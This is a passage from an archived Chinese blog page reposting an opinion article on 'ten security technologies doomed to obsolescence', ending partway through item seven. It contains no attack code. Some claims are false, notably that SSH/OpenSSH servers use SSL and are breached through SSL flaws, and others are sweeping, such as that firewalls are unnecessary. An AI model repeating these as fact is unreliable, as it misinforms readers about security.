<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="zh-cn">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="Content-Language" content="UTF-8" />
<meta content="all" name="robots" />
<meta name="author" content="流浪的龙－个人知识管理" />
<meta name="description" content="" />
<meta name="keywords" content="bo-blog" />
<xbasehref="http://i.renjihe.com/blog/" />
<link rel="alternate" title="流浪的龙－个人知识管理" href="feed.php" type="application/rss+xml" />
<link rel="stylesheet" rev="stylesheet" href="styles.css" tppabs="http://i.renjihe.com/blog/template/default/styles.css" type="text/css" media="all" />

<title>网络安全 - 流浪的龙－个人知识管理 - </title>
<script type="text/javascript" src="common.js-jsver=2.1.1.3626.3" tppabs="http://i.renjihe.com/blog/images/js/common.js?jsver=2.1.1.3626.3"></script>
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://i.renjihe.com/blog/inc/rsd.php" />
<script type="text/javascript" src="jslang.js-jsver=2.1.1.3626.3" tppabs="http://i.renjihe.com/blog/lang/zh-cn/jslang.js?jsver=2.1.1.3626.3"></script>
<script type="text/javascript" src="ajax.js-jsver=2.1.1.3626.3" tppabs="http://i.renjihe.com/blog/images/js/ajax.js?jsver=2.1.1.3626.3"></script>
<script type="text/javascript" src="swfobject.js-jsver=2.1.1.3626.3" tppabs="http://i.renjihe.com/blog/images/js/swfobject.js?jsver=2.1.1.3626.3"></script>
<script type="text/javascript">
//<![CDATA[
var moreimagepath="template/default/images";
var shutajax=0;
var absbaseurl='index.htm'/*tpa=http://i.renjihe.com/blog/*/;
//]]>
</script>
<link title="搜索 流浪的龙－个人知识管理" rel="search"  type="application/opensearchdescription+xml"  href="http://i.renjihe.com/blog/inc/opensearch.php" />



</head>
<body id="pagelocation-index">
<div id="wrapper">
	<div id="innerWrapper">
		<div id="header">
			<div id="innerHeader">
				<div id="blogLogo">
				</div>
				<div class="blog-header">
					<h1 class="blog-title"><a href="index.php.htm" tppabs="http://i.renjihe.com/blog/index.php">流浪的龙－个人知识管理</a></h1>
					<div class="blog-desc"></div>
				</div>
				<div id="menu">
					<ul>
					<li><span id="nav_index" class="activepage"><a href="index.php.htm" tppabs="http://i.renjihe.com/blog/index.php" ><span id="navitem_index" class="activepageitem">首页</span></a></span></li>
<li><span id="nav_http_3A_2F_2Fi.renjihe.com_2F"><a href="javascript:if(confirm('http://i.renjihe.com/  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://i.renjihe.com/'" tppabs="http://i.renjihe.com/"  target="_blank"><span id="navitem_http_3A_2F_2Fi.renjihe.com_2F">个性首页</span></a></span></li>
<li><span id="nav_http_3A_2F_2Fi.renjihe.com_2Flink.html"><a href="javascript:if(confirm('http://i.renjihe.com/link.html  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://i.renjihe.com/link.html'" tppabs="http://i.renjihe.com/link.html"  target="_blank"><span id="navitem_http_3A_2F_2Fi.renjihe.com_2Flink.html">网址导航</span></a></span></li>
<li><span id="nav_tag"><a href="tag.php.htm" tppabs="http://i.renjihe.com/blog/tag.php" ><span id="navitem_tag">标签</span></a></span></li>
<li><span id="nav_guestbook"><a href="guestbook.php.htm" tppabs="http://i.renjihe.com/blog/guestbook.php" ><span id="navitem_guestbook">留言</span></a></span></li>
					</ul>
				</div>
			</div>
		</div>
		<div id="mainWrapper">
			<div id="content" class="content">
				<div id="innerContent">
					<div class="announce" style="display: block">
						<div class="announce-content">
						网络安全
						</div>
					</div>
					<div class="article-top" style="display: none">
						<div class="pages">
							<span class="pagebar-mainbody"> 分页： 1/5  <a href="index.php-go=category_57&mode=1&page=1.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57&mode=1&page=1"><img src="doubleleft.gif" tppabs="http://i.renjihe.com/blog/template/default/images/arrows/doubleleft.gif" alt="第一页" title="第一页" border="0"/></a> <span class="pagebar-selections"> <span class="pagelink-current">1</span>  <a href="read.php-6643.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57&mode=1&page=2">2</a>  <a href="read.php-6642.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57&mode=1&page=3">3</a>  <a href="read.php-6641.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57&mode=1&page=4">4</a>  <a href="read.php-6640.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57&mode=1&page=5">5</a> </span> <a href="read.php-6643.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57&mode=1&page=2"><img src="singleright.gif" tppabs="http://i.renjihe.com/blog/template/default/images/arrows/singleright.gif" alt="下页" title="下页" border="0"/></a>  <a href="read.php-6640.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57&mode=1&page=5"><img src="doubleright.gif" tppabs="http://i.renjihe.com/blog/template/default/images/arrows/doubleright.gif" alt="最后页" title="最后页" border="0"/></a> </span> [ 显示模式： <a href="index.php-go=category_57&mode=1&page=1.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57&mode=1&page=1" title="切换到摘要模式">摘要</a> | <a href="index.php-go=category_57&mode=2&page=1.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57&mode=2&page=1" title="切换到列表模式">列表</a> ]
						</div>
					</div>
					<div class="textbox">
	<div class="textbox-calendar">
	<span class="textbox-calendar-month">Sep</span>
	<span class="textbox-calendar-day">7</span>
	</div>
	<div class="textbox-title">
		<h4>
		<a href="read.php-6830.htm" tppabs="http://i.renjihe.com/blog/read.php?6830">十大注定要被淘汰的安全技术</a> <span id="starid6830"><img src="unstarred.gif" tppabs="http://i.renjihe.com/blog/template/default/images/others/unstarred.gif" alt="" title="未加星标" border="0"/></span> <img src="blank.gif" tppabs="http://i.renjihe.com/blog/images/weather/blank.gif" alt="不指定" title="不指定"/>
		</h4>
		<div class="textbox-label">
		<a href="view.php-go=user_1.htm" tppabs="http://i.renjihe.com/blog/view.php?go=user_1" target="_blank">renjihe1988</a> , 20:47 , <a href="index.php-go=category_2.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_2" title="查看分类： 软件">软件</a> &raquo; <a href="index.php-go=category_57.htm" tppabs="http://i.renjihe.com/blog/index.php?go=category_57" title="查看分类： 网络安全">网络安全</a> , <a href="read.php-6830.htm#reply" tppabs="http://i.renjihe.com/blog/read.php?6830#reply" title="发表您的评论">评论(0)</a> , <a href='javascript: void(0);' title="查看引用地址" onclick='showhidediv("tb6830");'>引用(0)</a> , <a href="read.php-6830.htm" tppabs="http://i.renjihe.com/blog/read.php?6830">阅读(3)</a> , Via 本站原创 
		</div>
	</div>
	<div id="tb6830" style="display: none;" class="textbox-tburl"><strong>引用功能被关闭了。</strong></div>
	
	<div class="textbox-content">
	<p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">系统性漏洞和瞬息万变的威胁环境将毁灭许多当今值得信赖的安全技术。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">你是否曾有过这样的经历：启动软盘上的写入保护开关，以防止启动病毒和恶意覆写;关闭调制解调器，以防止黑客在晚上打来电话;卸载ansi.sys驱动，以防止恶意文本文件重新排布键盘，让下一次敲击直接格式化你的硬盘;检查autoexec.bat和config.sys文件，以确认没有恶意条目通过插入它们进行自启动。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; text-align: center; background-color: #f8f8f8"><a style="color: #004276" href="javascript:if(confirm('http://s4.51cto.com/wyfs02/M00/71/98/read.php?5456  \n\nļ޷ Teleport Ultra , Ϊ һ·ⲿΪʼַĵַ  \n\nڷϴ?'))window.location='http://s4.51cto.com/wyfs02/M00/71/98/read.php?5456'" tppabs="http://s4.51cto.com/wyfs02/M00/71/98/wKioL1XUScOT6T4nAAIkw41pM3k974.jpg" target="_blank"><img style="border: 0px" class="fit-image" src="read-1.php-5456" tppabs="http://s4.51cto.com/wyfs02/M00/71/98/wKioL1XUScOT6T4nAAIkw41pM3k974.jpg" border="0" alt="十大注定要被淘汰的安全技术" width="445" height="221" /></a></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">时过境迁，上述情况如今很难见到了。黑客们取得了进步，技术替代了过时的方式。有的时候，我们这些防御者做得如此之好，让黑客放弃了攻击，转向更有油水的目标。有的时候，某种防御功能会被淘汰，因为我们认为它不能提供足够的保护，或者存在意想不到的弱点。新的技术浪潮不论是大是小，都会带来新的威胁。黑客们迅速替换手中的技术，把去年流行的攻击方式扔进垃圾箱，而安全社区正在疲于奔命。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">也许没有什么东西，能够像计算机技术一样变化如此迅速。随着科技前进步步前进，保护它的责任也越变越重。如果你在计算机安全的世界里混迹已久，可能已经见识过很多安全技术的诞生和消亡。有的时候，你就快能够解决一种新的威胁了，而威胁本身却很快过时了。攻击和技术的步伐持续前进，即使是所谓最尖端的防御技术，比如生物认证和高级防火墙，都终将失败并退出局面。下面是那些注定要进入历史教科书的安全防御技术，我们五到十年后再翻开这篇文章，一定会超出你的想像。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"><strong style="text-align: center">No.1：生物认证</strong></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">在登录安全领域里，生物认证技术是十分诱人的良药。毕竟，你的脸、指纹、DNA或者其它生物标志似乎是完美的登录凭据。但这只是门外汉的见解。对专家而言，生物认证并没有看上去那么安全：如果它失窃，你本人的生物标志却无法改变。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><img style="border: none" class="fit-image" src="read-1.php-5455" tppabs="http://s7.51cto.com/wyfs02/M02/71/98/wKioL1XUTFLSW_3qAACxCOcQSoA186.jpg" border="0" alt="640.webp (105)" width="498" height="389" /><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">录入你的指纹吧。大多数人只有10个。任何时候你使用指纹作为生物识别凭据进行登录，那些指纹，或者更确切地说，其数字标识，必须被存储在某处以进行比对。不幸的是，这些数字标识损坏或者被盗是太常见的现象。如果坏人偷走了它们，你怎么能分辨出真实指纹凭据和对方手中数字标识的区别?</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">在这种情况下，唯一的解决办法是告诉世界上的每一个系统，不要继续使用你的指纹，但这几乎不可能做到。这对任何其它生物特征标记而言都是成立的。如果坏人得到了你生物信息的数字版本，要否认自己的DNA、脸、视网膜是很难的。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">还有另一种情况，如果你用于登录的那些生物特征，比如说指纹本身被破坏了呢?</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">加入生物识别的多因素认证是一种击败黑客的方法，比如在生物识别之外加上密码、PIN。但一些使用物理要素的双因素认证也可以很容易地做到这一点，比如智能卡、USB钥匙盘。如果丢失，管理人员可以很快地颁发给你新的物理认证方式，你也可以设置新的PIN或者密码。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">尽管生物识别登录正迅速成为时髦的安全功能，它们永远都不会变得无处不在。一旦人们意识到生物识别登录并不是它们看上去的那样，这种方式将失去人气，或者消失。其运用时总是要结合另一个认证要素，或者只是用在那些不需要高安全性的场景下。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"><strong style="text-align: center">No.2：SSL</strong></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">自1995年发明以来，安全套接层协议(Secure Socket Layer，SSL)存在了很长一段时间。在这二十年里，它为我们提供了充分的服务。但如果你还没有听说过的话，我们需要介绍一下Poodle攻击，它让SSL协议无可挽回地走远了。SSL的替代者传输层安全协议(Transport Layer Security，TLS)则表现稍好。在本文介绍的所有即将被扔进垃圾桶的安全技术中，SSL是最接近于被取代的。人们不应该再使用它了。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><img style="border: none" class="fit-image" src="read-1.php-5454" tppabs="http://s9.51cto.com/wyfs02/M02/71/9B/wKiom1XUSkXj4hMxAAB5fdXMr0A775.jpg" border="0" alt="0.webp" width="498" height="191" /><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">问题在哪?成百上千的网站依赖或启用了SSL。如果你禁用所有的SSL，这也是流行浏览器最新版本里的一般默认做法，各种网站都会变得无法连接。也许它们可以连接，但这只是因为浏览器或应用接受对SSL进行降级。此外，因特网上仍旧存在数百万计古老的安全Shell(Secure Shell，SSH)服务器。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">OpenSSH最近似乎一直在遭到入侵。尽管大约一半的攻击事件和SSL毫无关系，但另一半都是由于SSL的漏洞引起的。数百万计的SSH/OpenSSH网站仍在使用SSL，尽管他们根本不应该这样做。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">更糟糕的是，科技专家们使用的术语也在导致问题。几乎每个计算机安全行业内的人都会将TLS数字证书称为&ldquo;SSL证书&rdquo;，但这纯属指鹿为马：这些网站并不使用SSL。这就像是说一瓶可乐是可口可乐一样，尽管这瓶可乐可能是另外一个品牌。如果我们需要加快世界抛弃SSL的速度，就需要开始用本名称呼TLS证书。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">不要再使用SSL了，并且将Web服务器证书称为TLS证书。我们越早摆脱&ldquo;SSL&rdquo;这个词，它就能越快地被扫进历史的垃圾堆。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"><strong style="text-align: center">No.3：公钥加密</strong></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">如果量子计算的实现和配套的密码学出现，我们如今使用的大多数公钥加密技术：RSA、迪斐&middot;海尔曼(Diffie-Hellman，DH)等等将很快变成可读状态，这可能会让一些人大吃一惊。很多人长期以来都认为可使用级别的量子计算再过几年就要到来了，但这种估计属于盲目乐观。如果研究人员真的拿出了量子计算技术，大多数已知的公钥加密方式，包括那些流行算法，都会非常容易破解。世界各地的间谍机构经年累月地秘密保存着被锁死的机密文件，等着技术大突破。而且，如果你相信一些流言的话，他们已经解决了这个问题，正在阅读我们的所有秘密。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><img style="border: none" class="fit-image" src="read-2.php-5453" tppabs="http://s1.51cto.com/wyfs02/M02/71/9B/wKiom1XUSkaQWHeaAAAyF94M-Sk617.jpg" border="0" alt="0.webp (1)" width="498" height="276" /><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">一些密码学专家，比如布鲁斯&middot;施耐尔(Bruce Schneier)，一直以来对量子密码学的前景存有疑问。但批评家无法拒绝这种可能性：一旦它被开发出来，所有使用RSA、DF，甚至椭圆曲线(Elliptic Curve Cryptography，ECC)加密的密文瞬间变成了可读状态。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">这并不是说不存在量子级的加密算法。的确有一些，比如基于格(Lattice)方法的加密、超奇异同源密码交换(Supersingular Isogeny Key Exchange)。但如果你使用的公钥不属于这类，一旦量子计算开始普及，你的坏运气就要来了。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"><strong style="text-align: center">No.4：IPSec</strong></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">如果启用，IPsec会保护两点或多点间数据传输的完整性和隐私性，也即加密。这项技术发明于1993年，在1995年成为开放标准。数以百计的厂商支持IPsec，数百万计的计算机使用它。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><img style="border: none" class="fit-image" src="read-2.php-5448" tppabs="http://s6.51cto.com/wyfs02/M00/71/98/wKioL1XUTFTi9pAyAABCK1MycQA722.jpg" border="0" alt="640.webp (106)" width="426" height="282" /><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">不像本文中提到的其它例子，IPsec真的有用，而且效果很好，但它却有着另一方面的问题。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">首先，虽然它被广泛使用并部署，但从没达到大而不倒的规模。其次，IPsec十分复杂，并不是所有厂商都支持它。更糟的是，如果通讯双方中的一方支持IPsec，另一方如网关或负载平衡器不支持它，通讯经常会被破解。在许多公司中，IPSec通常作为可选项存在，强制使用它的电脑很少。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">IPsec的复杂性也造成了性能问题。除非你在IPsec隧道两侧都部署专门硬件，不然它就会显著减缓所有用到它的网络连接。因此，大型的事务服务器，比如数据库和大多数Web服务器根本无法支持它。而这两类服务器恰恰是存储最重要数据的地方。如果你不能用IPsec保护大部分数据，它又能带来什么好处呢?</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">另外，尽管它是一个&ldquo;公共&rdquo;的开放标准，IPsec的实现却通常无法在各个厂商之间共用，这是另一个减缓乃至阻止IPsec被广泛部署的原因。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">但对IPsec而言，真正的丧钟是HTTPS得到了广泛使用。如果你启用了HTTPS，就不再需要IPsec。这是个两者必择其一的选择，世界作出了它的决定。HTTPS赢了。只要你有一份有效的TLS电子证书，一个兼容的客户端，就能使用HTTPS：没有交互问题、复杂度低。存在一些性能影响，但对大多数用户而言微不足道。全球正迅速变成一个默认使用HTTPS的世界。在这个过程中，IPsec将会死亡。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"><strong style="text-align: center">No.5：防火墙</strong></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">无处不在的HTTPS基本上宣告了传统防火墙的末日。早在三年前就有人写过相关文章，但三年过去，防火墙依旧无处不在。但真实情况呢?它们大多数未经配置，几乎全部都没有配备&ldquo;最低容许度，默认屏蔽&rdquo;规则，然而正是这种规则才让防火墙具备了价值。相信不少人都知道大多数防火墙规则过于宽松，甚至&ldquo;允许所有XXX&rdquo;这样规则的防火墙也不稀罕.这样配置的防火墙基本上还不如不存在。它啥都没干，只是在拖网速后腿。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><img style="border: none" class="fit-image" src="read-2.php-5444" tppabs="http://s8.51cto.com/wyfs02/M00/71/98/wKioL1XUTFSCEuzEAAA2ETdW7Hs736.jpg" border="0" alt="640.webp (107)" width="425" height="282" /><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">不管你怎么定义防火墙，它必须包括一个部分：只允许特定的、预配置的接口，只有这样它才能算是有用。随着这个世界向着HTTPS化迈进，最终，所有防火墙都会只剩下几条规则：HTTP、HTTPS和DNS。其它协议，比如ads DNS、DHCP等等，也会开始使用HTTPS-only。事实上，很难想象一个不是以全民HTTPS化告终的世界。当这一切来临，防火墙何去何从?</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">防火墙提供的主要防御功能是保护脆弱的服务免遭远程攻击。具有远程脆弱性的服务通常极易破坏，远程利用缓冲区溢出是最常见的攻击方式。看看莫里斯蠕虫(Robert Morris Internet worm)、红色警戒(Code Red)、冲击波(Blaster)和蓝宝石(SQL Slammer)吧。你能回忆起最近一次世界级缓冲区溢出蠕虫攻击出现在哪年吗?应该不会超过本世纪头几年。而这些蠕虫都还远不及上世纪八九十年代那些的威力。基本上，如果你不使用未打补丁、存在漏洞的监听服务，就不需要传统防火墙。你现在就不需要。对，你没听错。你不需要防火墙。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">一些防火墙厂商经常鼓吹他们的&ldquo;高级&rdquo;防火墙拥有传统产品远不能及的功能。但这种所谓的&ldquo;高级防火墙&rdquo;只要它们进行&ldquo;数据包深度检查&rdquo;或签名扫描，只会导致两种结果：其一，网速大幅度下降，返回结果充斥着假阳性;其二，只扫描一小部分攻击。大多数&ldquo;高级&rdquo;防火墙只会扫描数十到数百种攻击。如今，每天都会出现超过39万种新型恶意软件，这还不包括那些隐藏在合法活动中无法识别的。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">即使防火墙真的达到了他们宣称的防护级别，它们也不是真的有效。因为如今企业面临的两种最主要的恶意攻击类型是：未打补丁的软件和社会工程。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">这么说吧，是否配备防火墙都一样被黑。也许它们在过去表现太好了，导致黑客转向了别的攻击类型。但不管是什么原因，防火墙如今已经几乎没有用了，从过去十年前这个趋势就开始了。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"><strong style="text-align: center">No.6：反病毒扫描</strong></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">恶意软件数量目前在数千万到上亿级别，其具体数字取决于你相信谁给出的数据。一个压倒性的事实是，反病毒扫描软件几乎已经没有用了。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><img style="border: none" class="fit-image" src="read-1.php-5442" tppabs="http://s1.51cto.com/wyfs02/M00/71/9B/wKiom1XUSkeBNKhsAAB6dtKiZB8707.jpg" border="0" alt="640.webp (108)" width="498" height="351" /><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">但也并不是完全没用，因为它们会阻挡80到99.9%对普通用户的攻击。但普通用户每年都会接触到成百上千的恶意程序。哪怕用户手气再好，坏人也会时不时地赢上那么一两次。如果你的PC一年都没有接触到恶意软件，你一定是做了什么特别的事情。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">这并不是说我们不应该为反病毒厂商喝彩。为了对抗天文数字的赔率，他们的工作量巨大。我想不到有任何一个产业能够应对恶意软件数量如此快速的增长，而且使用的还是自上世纪八十年代以来就存在的老技术，在那时候只有几十种病毒需要检测。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">真正杀死反病毒扫描软件的不是恶意软件的数量，而是白名单。当今的普通计算机会运行所有你安装的程序。这使得恶意软件到处都是。但电脑和操作系统厂商已经开始改变&ldquo;见什么运行什么&rdquo;的模式，以提升用户的安全性。这项运动和杀毒软件是对立的。后者的逻辑是，让一切运行畅通，除了包括那些含有已知的那5亿反病毒签名的软件。&ldquo;默认运行，例外禁止&rdquo;正被&ldquo;默认禁止，例外运行&rdquo;所代替。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">当然，电脑上早就有白名单程序了，也就是应用控制软件。我在2009年回顾了一些受欢迎的此类产品。问题在于：大多数人不使用白名单，即便它是内置的。最大的障碍?用户担心不能再安装所有那些乱七八糟的东西了，而且批准能在用户系统上运行的所有软件也是一项令人头疼的工程。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">然而恶意软件和黑客攻击正日益普遍，厂商开始在默认情况下启用白名单。苹果的OS X系统在三年前推出了一项默认白名单功能，被称为Gatekeeper。iOS设备使用白名单机制的历史更长，除非越狱，它们只能运行被批准在App Store上架的应用。苹果漏掉了一些恶意软件，但这项工程对于阻止针对流行操作系统和程序的大量恶意软件功不可没。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">微软在更早的时候就通过软件限制策略(Software Restriction Policies)和AppLocker引入了类似机制。Windows10带来的DeviceGuard则有力地推动了这项工程。微软的Windows商店采取了和苹果App Store类似的保护机制。尽管微软不会默认开启DeviceGuard，也不会默认只运行从Windows商店上安装的应用，但白名单功能已经相对健全，也比以前更易用。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">一旦白名单变成了多数操作系统上的默认选项，对恶意软件而言就是游戏结束的时间，然后，对反病毒扫描软件而言也是如此。很难说人们会想念两者之中的任何一个。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"><strong style="text-align: center">No.7：反骚扰过滤</strong></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8">骚扰邮件仍旧占全网邮件数的一半。多亏了反骚扰过滤，你可能没有注意到这一点。反骚扰过滤真的实现了那些反病毒厂商声称的精确性，不过它们每天仍旧会漏过数以十亿计的邮件。只有两件东西可以阻止骚扰：通用的、普适的、高安全性的认证和更具结合性的国际法。</p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><img style="border: none" class="fit-image" src="read-1.php-5441" tppabs="http://s5.51cto.com/wyfs02/M00/71/9B/wKiom1XUSkfyFpLSAABKgmi9cFo892.jpg" border="0" alt="640.webp (109)" width="498" height="324" /><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: #f8f8f8"></p><p style="margin: 10px 0px; padding: 0px; color: #333333; text-indent: 28px; font-family: 宋体; font-size: 14px; line-height: 28px; background-color: 